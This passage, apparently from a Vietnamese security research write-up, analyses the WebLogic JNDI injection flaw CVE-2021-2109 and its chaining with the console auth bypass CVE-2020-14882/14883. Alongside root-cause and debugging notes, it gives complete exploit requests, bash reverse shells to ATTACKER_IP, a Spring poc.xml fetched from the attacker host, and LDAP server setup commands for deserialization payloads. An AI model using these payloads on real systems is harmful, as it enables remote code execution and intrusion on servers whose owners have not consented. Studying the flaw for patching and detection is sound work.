Object result = namingContext.lookup(context + binding);    // ← JNDI injection!
// → lookup("ldap://192.168.0.10:1389/dc=a")
// → JNDI federation: connect to attacker LDAP server
// → attacker returns malicious Reference or serialized object → RCE
```

**Tóm tắt luồng:**

```
GET /console/css/%252e%252e%252fconsolejndi.portal
    ?_pageLabel=JNDIBindingPageGeneral&_nfpb=true
    &JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("ldap://192.168.0;10:1389/dc=a;AdminServer")

  → MBeanUtilsInitSingleFileServlet.service()               [entry point]
    → SingleFileServlet → consolejndi.portal rendering
      → HandleFactory.getHandle() → JndiBindingHandle()     [Source — user input]
        → HandleImpl.getComponents(): split by ";"
          → ["ldap://192.168.0", "10:1389/dc=a", "AdminServer"]
        → JNDIBindingAction.execute()
          → context + "." + binding = "ldap://192.168.0.10:1389/dc=a"
          → namingContext.lookup("ldap://192.168.0.10:1389/dc=a")  [Sink — JNDI injection]
            → LDAP federation → attacker server → RCE
```

### 4.3. Root Cause

`JNDIBindingAction.execute()` lấy JNDI context và binding name từ `JndiBindingHandle`, rồi gọi `InitialContext.lookup()` với giá trị do attacker kiểm soát — **không validate URL scheme** (`ldap://`, `rmi://`):

```java
// JNDIBindingAction.execute()  — key code
Object result = namingContext.lookup(context + binding);
//                                   ^^^^^^^^^^^^^^^^^
//                    attacker controls cả context và binding
//                    → JNDI URL injection → attacker LDAP/RMI server
```

**Handle parsing trick**: `HandleImpl.getComponents()` split bằng `;`:

```
Input:  "ldap://192.168.0;10:1389/path;AdminServer"
Split:  ["ldap://192.168.0", "10:1389/path", "AdminServer"]

context = "ldap://192.168.0"  + "."  →  "ldap://192.168.0."
binding = "10:1389/path"
lookup("ldap://192.168.0.10:1389/path")  ← valid LDAP URL, IP reconstructed
```

Dấu `;` dùng để chia IP thành components, `JNDIBindingAction` tự nối lại bằng `.` → reconstruct IP gốc.

### 4.4. Cách Fix (Oracle Patch)

Oracle fix bằng cách validate `context` và `binding` trong `JNDIBindingAction`:
- Block JNDI URL schemes (`ldap://`, `rmi://`, `iiop://`) trong giá trị lookup
- Sanitize input trước khi gọi `InitialContext.lookup()`

### 4.5. JNDI Injection — 2 kiểu tấn công

#### 4.5.1. Kiểu 1: Remote Codebase (Reference)

```
Victim                         Attacker
  |  lookup("ldap://...")        |
  |  ──────────────────────────► |  LDAP Server
  |  Reference(factory, codebase)|
  |  ◄────────────────────────── |
  |  GET /Evil.class             |
  |  ──────────────────────────► |  HTTP Server
  |  class bytes                 |
  |  ◄────────────────────────── |
  |  new Evil() → static block  |
  |  → RCE                      |
```

**Yêu cầu**: `com.sun.jndi.ldap.object.trustURLCodebase=true` (mặc định `false` từ JDK 8u191)

#### 4.5.2. Kiểu 2: Deserialization (javaSerializedData)

```
Victim                         Attacker
  |  lookup("ldap://...")        |
  |  ──────────────────────────► |  LDAP Server
  |  javaSerializedData: [bytes] |
  |  ◄────────────────────────── |
  |  readObject(bytes) → gadget  |
  |  → RCE                      |
```

**Không cần `trustURLCodebase`**. Cần gadget chain trong classpath victim.

### 4.6. Kết hợp CVE-2020-14882 + CVE-2021-2109

Dùng auth bypass path cho `consolejndi.portal`:

```http
GET /console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("ldap://ATTACKER_IP_PART;LAST_OCTET:1389/dc=a;AdminServer") HTTP/1.1
Host: TARGET:7001
```

**Hạn chế khi chain với CVE-2020-14882**:

CVE-2020-14882 chỉ bypass web.xml security constraint, **không tạo authenticated session**. Khi `consolejndi.portal` render:
- `JNDIBindingAction.execute()` gọi `MBeanUtils.getAnyServerMBean(server)` → cần MBean access
- `principals = []` → `NoAccessRuntimeException`

Tuy nhiên, `JNDIBindingAction` vẫn có thể chạy nếu:
- Server name trong handle khớp đúng server instance (e.g., `AdminServer`)
- MBean access cho read-only lookup được phép ở mức lower privilege
- Một số version/config không enforce MBean check cho JNDI lookup

### 4.7. LDAP URL — Vấn đề DN hợp lệ

LDAP path phải là DN (Distinguished Name) hợp lệ. Route phức tạp có `/` (ví dụ `/Basic/Command/xxx`) sẽ gây error 34:

```
InvalidNameException: [LDAP: error code 34 - Unable to parse 'Basic/M-LF-/Evil.class' as a DN]
```

**Fix**: Dùng `setRoute` (JYso) hoặc marshalsec:

```bash
# JYso — set route qua HTTP, dùng DN đơn giản trong handle
curl "http://ATTACKER:3456/setRoute=deserialization/CommonsBeanutils2/command/base64/BASE64CMD"
# Handle: ldap://IP_PART;LAST:1389/dc=a;AdminServer

# marshalsec — trả Reference cho mọi DN
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER:8888/#Evil" 1389
# Handle: ldap://IP_PART;LAST:1389/dc=a;AdminServer
```

### 4.8. Gadget chains khả dụng (WebLogic 12.2.1.4, JDK 8u451)

| Chain                  | Classpath?                      | Protection?      | Khả thi? |
| ---------------------- | ------------------------------- | ---------------- | -------- |
| Coherence (CVE-2020-2555) | `coherence.jar`              | Không            | **Có**   |
| CommonsBeanutils1NoCC  | `commons-beanutils-1.9.3.jar` + JDK | Không       | **Có**   |
| JRMP redirect          | JDK built-in                    | Không            | **Có**   |
| CommonsCollections 1-7 | `commons-collections-3.2.2.jar` | **Có** (readObject check) | Không |

---

## 5. Payload mẫu — Reverse Shell

### 5.1. CVE-2020-14882 + CVE-2020-14883 — ShellSession

```http
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(new String[]{'/bin/bash','-c','bash -i >%26 /dev/tcp/ATTACKER_IP/PORT 0>%261'})") HTTP/1.1
Host: TARGET:7001
```

### 5.2. CVE-2020-14882 + CVE-2020-14883 — FileSystemXmlApplicationContext

```http
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://ATTACKER_IP:PORT/poc.xml") HTTP/1.1
Host: TARGET:7001
```

**poc.xml:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

### 5.3. CVE-2020-14882 + CVE-2021-2109 — JNDI + LDAP Deserialization

**Bước 1 — Start JYso LDAP server:**

```bash
java -jar JYso.jar -j -i ATTACKER_IP -lP 1389 -hP 3456
```

**Bước 2 — Set route (deserialization, bypass trustURLCodebase):**

```bash
CMD_B64=$(echo -n "bash -c {echo,$(echo -n 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' | base64)}|{base64,-d}|bash" | base64)
curl "http://ATTACKER_IP:3456/setRoute=deserialization/CommonsBeanutils2/command/base64/${CMD_B64}"
```

**Bước 3 — Send exploit:**

```http
GET /console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("ldap://ATTACKER_A.B.C;D:1389/dc=a;AdminServer") HTTP/1.1
Host: TARGET:7001
```

> IP trick: `192.168.0.10` → `192.168.0;10` (chia octet cuối bằng `;`)

### 5.4. CVE-2020-14882 + CVE-2021-2109 — JNDI + Remote Codebase (cần trustURLCodebase=true)

**Bước 1 — Start JNDI-Injection-Exploit (welk1n):**

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE=}|{base64,-d}|bash" \
  -A "ATTACKER_IP"
```

**Bước 2 — Send exploit (dùng random path từ welk1n output):**

```http
GET /console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("ldap://ATTACKER_A.B.C;D:1389/RANDOM_PATH;AdminServer") HTTP/1.1
Host: TARGET:7001
```

> **Lưu ý**: Yêu cầu JVM property `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true` trên target (mặc định `false` từ JDK 8u191).

---

## 6. Breakpoint Strategy (Debug)

| Order | Class                                    | Method           | Mục đích                        |
| ----- | ---------------------------------------- | ---------------- | ------------------------------- |
| 1     | `WebAppSecurity`                         | `checkAccess()`  | Xem auth bypass xảy ra          |
| 2     | `SingleFileServlet`                      | `service()`      | Xem request sau bypass           |
| 3     | `HandleFactory`                          | `getHandle()`    | Xem handle string parsing        |
| 4     | `FileSystemXmlApplicationContext`        | `<init>()`       | Xem gadget A trigger             |
| 5     | `ShellSession`                           | `<init>()`       | Xem gadget B trigger             |
| 6     | `HandleImpl`                             | `getComponents()`| Xem `;` splitting (CVE-2021-2109)|
| 7     | `JNDIBindingAction`                      | `execute()`      | Xem JNDI lookup construction     |
